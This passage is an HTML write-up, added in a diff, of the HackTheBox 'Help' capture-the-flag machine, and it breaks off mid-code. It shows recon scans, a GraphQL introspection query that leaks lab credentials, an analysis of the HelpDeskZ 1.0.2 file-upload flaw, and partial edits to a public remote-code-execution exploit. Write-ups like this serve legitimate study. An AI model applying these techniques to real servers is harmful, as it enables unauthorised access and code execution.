@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Help</strong></h1>
+        Released: 9th March 2019 / Pwned: May 15th 2019 - [+] Solved whilst Active<br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This is a fun box once you finish it, but not during. The devil is in the details.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.121</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;10.10.10.121<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-05-15&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.121<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.065s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;997&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.6&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07&nbsp;(ED25519)<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;((Ubuntu))<br>
+                |_http-server-header:&nbsp;Apache/2.4.18&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Apache2&nbsp;Ubuntu&nbsp;Default&nbsp;Page:&nbsp;It&nbsp;works<br>
+                3000/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Node.js&nbsp;Express&nbsp;framework<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(application/json;&nbsp;charset=utf-8).<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                <br>
+                Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;22.40&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        Analysis:<br>
+        <strong>22/ssh</strong> is nice to have running.<br>
+        <strong>80/http</strong> is always good too.<br>
+        <strong>3000/http</strong> is running Node.js, which seems interesting.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 3000/http - JSON</strong></h2><br>
+        A JSON page. Note that this step isn't actually necessary, you can get a shell without it.<br>
+        <br>
+        JSON - JavaScript Object Notation - is a format for storing data and is an easy/simple format to retrieve data from (what makes it popular).<br>
+        <br>
+        If this was a REST API (what JSON normally is(?)) you would query an object (e.g. users) and then choose a field in that database (e.g. 5) or search for a value of a parameter:<br>
+        <a href="https://jsonplaceholder.typicode.com/todos/5">https://jsonplaceholder.typicode.com/users/5</a> - query <em>users</em> object and list the 5th field<br>
+        <a href="https://jsonplaceholder.typicode.com/users?username=Bret">https://jsonplaceholder.typicode.com/users?username=Bret</a> - query <em>users</em> object and search username parameter for "Bret"<br>
+        <br>
+        But trying to query data on <code>10.10.10.121:3000</code> just returns errors:<br>
+        <code>http://10.10.10.121:3000/message</code><br>
+        <code>http://10.10.10.121:3000/users</code><br>
+        <code>http://10.10.10.121:3000/users?username=Shiv</code><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2a) GraphQL</strong></h3><br>
+        Instead, this a GraphQL backend (thanks to 1NC39T10N on the htb forums for the hint).<br>
+        With REST APIs, the client interacts with programmer written code to retrieve JSON data.<br>
+        With GraphQL, the client interacts with GraphQL, and then GraphQL interacts with the programmer written code to retrieve JSON data.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        (Image credits: <a href="http://bearcatjs.org/graphql-versus-rest-api/">http://bearcatjs.org/graphql-versus-rest-api/</a>)<br>
+        <br>
+        This means that requests for data can be simpler, and you can retrieve multiple pieces of data from multiple sources with 1 request (unlike REST which would take multiple).<br>
+        <br>
+        This is the post I found explaining GraphQL + security.<br>
+        <a href="https://blog.doyensec.com/2018/05/17/graphql-security-overview.html">https://blog.doyensec.com/2018/05/17/graphql-security-overview.html</a><br>
+        <br>
+        You can tell this is a GraphQL backend because if we enter an intentionally incorrect query - <code>/graphql?query={}</code> - we receive an error:<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Other URLs to test for GraphQL backends are:<br>
+        <code>/graphql<br>
+        /graphql/console/<br>
+        /graphql.php<br>
+        /graphql.php?debug=1</code> (debugging mode with additional error reporting, may be left open by developers)<code><br>
+        /graphiql<br>
+        /graphiql.php</code><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2b) What data is retrievable from GraphQL?</strong></h3><br>
+        The current problem we have is that we don't know what data we can retrieve from the GraphQL endpoint.<br>
+        doyensec from the blogpost above has a helpful script:<br>
+        <br>
+        GraphQL_Introspection.py - <a href="https://github.com/doyensec/graph-ql">https://github.com/doyensec/graph-ql</a><br>
+        <br>
+        which results in finding a query which leads to a username and password.<br>
+        <br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>3000http#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>doyensec<span style="color:#ff9d00;font-weight:700">/</span>graph-ql<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>Introspection<span style="color:#ff9d00;font-weight:700">/</span>GraphQL_Introspection.py<br>
+                --2019-05-15&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>30--&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>doyensec<span style="color:#ff9d00;font-weight:700">/</span>graph-ql<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>Introspection<span style="color:#ff9d00;font-weight:700">/</span>GraphQL_Introspection.py<br>
+                Resolving&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)</span>...&nbsp;151.101.16.133<br>
+                Connecting&nbsp;to&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)|</span>151.101.16.133<span style="color:#ff9d00;font-weight:700">|:</span>443...&nbsp;connected.<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;200&nbsp;OK<br>
+                Length<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;47737&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>47K<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[text<span style="color:#ff9d00;font-weight:700">/</span>plain]<br>
+                Saving&nbsp;to<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;‘GraphQL_Introspection.py’<br>
+                <br>
+                GraphQL_Introspection.py&nbsp;&nbsp;100%[===================================&gt;]&nbsp;&nbsp;46.62K&nbsp;&nbsp;--.-KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.09s&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                2019-05-15&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>31&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>503&nbsp;KB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;‘GraphQL_Introspection.py’&nbsp;saved&nbsp;[47737<span style="color:#ff9d00;font-weight:700">/</span>47737]<br>
+                <br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>3000http#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                10.10.10.121.json&nbsp;&nbsp;GraphQL_Introspection.py<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>3000http#&nbsp;python&nbsp;GraphQL_Introspection.py&nbsp;<br>
+                [<span style="color:#ff9d00;font-weight:700">!</span>]&nbsp;Remote&nbsp;GraphQL&nbsp;Endpoint&nbsp;OR&nbsp;a&nbsp;Schema&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;JSON&nbsp;format&nbsp;must&nbsp;be&nbsp;specified<span style="color:#ff9d00;font-weight:700">!</span><br>
+                usage<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;GraphQL_Introspection.py&nbsp;[-h]&nbsp;[-t&nbsp;TARGET]&nbsp;[-f&nbsp;SCHEMA_JSON_FILE]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[-k&nbsp;KEY]&nbsp;[-p&nbsp;PROXY]&nbsp;[-d]<br>
+                <br>
+                GraphQL&nbsp;Introspection<br>
+                <br>
+                optional&nbsp;arguments<span style="color:#ff9d00;font-weight:700">:</span><br>
+                &nbsp;&nbsp;-h,&nbsp;--help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show&nbsp;this&nbsp;<span style="color:#ff9d00;font-weight:700">help</span>&nbsp;message&nbsp;and&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
+                &nbsp;&nbsp;-t&nbsp;TARGET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;GraphQL&nbsp;Endpoint&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>https<span style="color:#ff9d00;font-weight:700">://</span>&lt;Target_IP&gt;<span style="color:#ff9d00;font-weight:700">/</span>graphql<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;-f&nbsp;SCHEMA_JSON_FILE&nbsp;&nbsp;Schema&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;JSON&nbsp;format<br>
+                &nbsp;&nbsp;-k&nbsp;KEY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;API&nbsp;Authentication&nbsp;Key<br>
+                &nbsp;&nbsp;-p&nbsp;PROXY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP&nbsp;of&nbsp;web&nbsp;proxy&nbsp;to&nbsp;go&nbsp;through&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>http<span style="color:#ff9d00;font-weight:700">://</span>127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>8080<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;-d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replace&nbsp;known&nbsp;GraphQL&nbsp;arguments&nbsp;types&nbsp;with&nbsp;placeholder<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;values&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>useful&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">Burp</span>&nbsp;Suite)<br>
+                root@kali:~/ctf/help/3000http#&nbsp;python&nbsp;GraphQL_Introspection.py&nbsp;-t&nbsp;http://10.10.10.121:3000/graphql<br>
+                [+]&nbsp;Writing&nbsp;Queries&nbsp;Templates<br>
+                &nbsp;|&nbsp;&nbsp;user<br>
+                [+]&nbsp;Writing&nbsp;Mutations&nbsp;Templates<br>
+                [+]&nbsp;Writing&nbsp;Subscriptions&nbsp;Templates<br>
+                [+]&nbsp;DONE<br>
+                root@kali:~/ctf/help/3000http#&nbsp;ls<br>
+                10.10.10.121:3000&nbsp;&nbsp;10.10.10.121.json&nbsp;&nbsp;GraphQL_Introspection.py<br>
+                root@kali:~/ctf/help/3000http#&nbsp;cd&nbsp;10.10.10.121\:3000/<br>
+                root@kali:~/ctf/help/3000http/10.10.10.121:3000#&nbsp;ls<br>
+                doc-2019-05-15-1557917343.html&nbsp;&nbsp;mutation&nbsp;&nbsp;query&nbsp;&nbsp;schema-2019-05-15-1557917343.txt&nbsp;&nbsp;subscription<br>
+                root@kali:~/ctf/help/3000http/10.10.10.121:3000#&nbsp;cd&nbsp;query/<br>
+                root@kali:~/ctf/help/3000http/10.10.10.121:3000/query#&nbsp;ls<br>
+                2019-05-15<br>
+                root@kali:~/ctf/help/3000http/10.10.10.121:3000/query#&nbsp;cd&nbsp;2019-05-15/<br>
+                root@kali:~/ctf/help/3000http/10.10.10.121:3000/query/2019-05-15#&nbsp;ls<br>
+                1557917343<br>
+                root@kali:~/ctf/help/3000http/10.10.10.121:3000/query/2019-05-15#&nbsp;cd&nbsp;1557917343/<br>
+                root@kali:~/ctf/help/3000http/10.10.10.121:3000/query/2019-05-15/1557917343#&nbsp;ls<br>
+                user.txt<br>
+                root@kali:~/ctf/help/3000http/10.10.10.121:3000/query/2019-05-15/1557917343#&nbsp;cat&nbsp;user.txt&nbsp;<br>
+                {"query":"query{user(){username&nbsp;password&nbsp;}}"}
+            </div>
+        </div><br>
+        <br>
+        Use the query that GraphQL_Introspection.py found in the URL like this:<br>
+        <code>http://10.10.10.121:3000/graphql?query={user{username password}}</code><br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        That password is an md5 hash by the way.<br>
+        <code>helpme@helpme.com<br>
+        godhelpmeplz</code><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 80/http</strong></h2><br>
+        Just a default apahce page.<br>
+        <br>
+        Nikto points to where we need to go - /support.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nikto&nbsp;-h&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.121&nbsp;-o&nbsp;nikto.txt<br>
+                -&nbsp;Nikto&nbsp;v2.1.6<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;Target&nbsp;IP<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.10.121<br>
+                +&nbsp;Target&nbsp;Hostname<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;10.10.10.121<br>
+                +&nbsp;Target&nbsp;Port<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;80<br>
+                +&nbsp;Start&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2019-05-15&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>05<span style="color:#ff9d00;font-weight:700">:</span>10&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GMT1<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;Server<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ...<br>
+                +&nbsp;OSVDB-3092<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>support<span style="color:#ff9d00;font-weight:700">/:</span>&nbsp;This&nbsp;might&nbsp;be&nbsp;interesting...<br>
+                ...<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;1&nbsp;host<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;tested
+            </div>
+        </div><br>
+        <br>
+        <code>http://10.10.10.121/support</code><br>
+        This is where we use our login credentials (although you don't actually need them). Login to the app.<br>
+        <br>
+        If you see an app/product, always searchsploit it.<br>
+        For HelpDeskZ, the submit ticket functionality has some vulnerabilities.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>80tcp#&nbsp;searchsploit&nbsp;helpdeskz<br>
+                -------------------------------------------------------------&nbsp;<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------------&nbsp;<br>
+                HelpDeskZ&nbsp;1.0.2&nbsp;-&nbsp;Arbitrary&nbsp;File&nbsp;Upload&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>40300.py<br>
+                HelpDeskZ&nbsp;&lt;&nbsp;1.0.2&nbsp;-&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Authenticated<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;SQL&nbsp;Injection&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;Unauthor&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>41200.py<br>
+                --------------------------------------------------------------<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        <code>40300.py</code> is what we want.<br>
+        As the exploit explains, you can get remote code execution by uploading a .php file.<br>
+        The authors of HelpDeskZ thought that uploading a php file would be secure because:<br>
+        - the filename + current time of the server are hashed together<br>
+        - and that hash is used for the name of your uploaded file<br>
+        <br>
+        I guess the intention was that you're never going to find the file name.<br>
+        <br>
+        As the exploit describes, you can just bruteforce for the uploaded file name by getting the current time of the server and producing the hash yourself and checking for the file.<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3a) File is not allowed?</strong></h3><br>
+        If you try to upload a php file, you're told:<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        But this isn't strictly true.<br>
+        Reviewing the source code - <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php">https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php</a> - as far as I can understand from reading the snippet below, the upload doesn't get blocked and there's no modifications made, it just prints the “File is not allowed� message and carries on.<br>
+        <br>
+        <code>case '2':<br>
+        $show_step2 = true;<br>
+        $error_msg = $LANG['FILE_NOT_ALLOWED'];<br>
+        break;</code><br>
+        <br>
+            <div class="codebox">
+                if(!isset($error_msg)&nbsp;&amp;&amp;&nbsp;$settings['ticket_attachment']==1){<br>
+                $uploaddir&nbsp;=&nbsp;UPLOAD_DIR.'tickets/';<br>
+                if($_FILES['attachment']['error']&nbsp;==&nbsp;0){<br>
+                $ext&nbsp;=&nbsp;pathinfo($_FILES['attachment']['name'],&nbsp;PATHINFO_EXTENSION);<br>
+                $filename&nbsp;=&nbsp;md5($_FILES['attachment']['name'].time()).".".$ext;<br>
+                $fileuploaded[]&nbsp;=&nbsp;array('name'&nbsp;=&gt;&nbsp;$_FILES['attachment']['name'],&nbsp;'enc'&nbsp;=&gt;&nbsp;$filename,&nbsp;'size'&nbsp;=&gt;&nbsp;formatBytes($_FILES['attachment']['size']),&nbsp;'filetype'&nbsp;=&gt;&nbsp;$_FILES['attachment']['type']);<br>
+                $uploadedfile&nbsp;=&nbsp;$uploaddir.$filename;<br>
+                if&nbsp;(!move_uploaded_file($_FILES['attachment']['tmp_name'],&nbsp;$uploadedfile))&nbsp;{<br>
+                $show_step2&nbsp;=&nbsp;true;<br>
+                $error_msg&nbsp;=&nbsp;$LANG['ERROR_UPLOADING_A_FILE'];<br>
+                }else{<br>
+                $fileverification&nbsp;=&nbsp;verifyAttachment($_FILES['attachment']);<br>
+                switch($fileverification['msg_code']){<br>
+                case&nbsp;'1':<br>
+                $show_step2&nbsp;=&nbsp;true;<br>
+                $error_msg&nbsp;=&nbsp;$LANG['INVALID_FILE_EXTENSION'];<br>
+                break;<br>
+                case&nbsp;'2':<br>
+                $show_step2&nbsp;=&nbsp;true;<br>
+                $error_msg&nbsp;=&nbsp;$LANG['FILE_NOT_ALLOWED'];<br>
+                break;<br>
+                case&nbsp;'3':<br>
+                $show_step2&nbsp;=&nbsp;true;<br>
+                $error_msg&nbsp;=&nbsp;str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);<br>
+                break;
+            </div>
+        </div><br>
+        <br>
+        So whilst the ticket doesn't get created, the php file will still be uploaded.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3b) Find the file upload location</strong></h3><br>
+        You have to know where your file will get uploaded to, and you have to review the source code for this.<br>
+        <br>
+        <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php">https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php</a> contains:<br>
+        <code>UPLOAD_DIR.'tickets/</code><br>
+        <br>
+        And <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/global.php">https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/global.php</a> defines UPLOAD_DIR:<br>
+        <code>define('UPLOAD_DIR', ROOTPATH . 'uploads/');</code><br>
+        <br>
+        submit_ticket_controller.php contained <code>include(INCLUDES.'helpdesk.inc.php');</code> at the top of the file, so I just ctrl+F'd for ‘UPLOAD_DIR’ in every file in the includes directory on github (<a href="https://github.com/evolutionscript/HelpDeskZ-1.0/tree/master/includes">https://github.com/evolutionscript/HelpDeskZ-1.0/tree/master/includes</a>) until I found it :)<br>
+        <br>
+        SO, the full URL of the file upload location is <code>http://10.10.10.121/support/uploads/tickets/&lt;file&gt;</code><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>3c) Modify the exploit</strong></h3><br>
+        The exploit on exploitdb is different to the one found in /usr/share/exploitdb, because the version on exploitdb has been updated. The updated version sucks, don't use it. It's full of syntax errors and the <code>currentTime</code> variable for retrieving the current time from the server doesn't work (because of syntax errors).<br>
+        <br>
+        Instead, copy the exploit from /usr/share/exploitdb to your current directory, and modify the script to import the datetime module - <code>import datetime</code>, include <code>r = requests.get(helpdeszBaseUrl)</code> and correct the synxtax of <code>currentTime</code>. The modified bits of the script should look like this:<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;datetime<br>
+                [......]<br>
+                helpdeskzBaseUrl&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>]<br>
+                fileName&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">2</span>]<br>
+                <br>
+                r&nbsp;=&nbsp;requests.get(helpdeskzBaseUrl)<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#Gets&nbsp;the&nbsp;current&nbsp;time&nbsp;of&nbsp;the&nbsp;server&nbsp;to&nbsp;prevent&nbsp;timezone&nbsp;errors&nbsp;-&nbsp;DoctorEww</span><br>
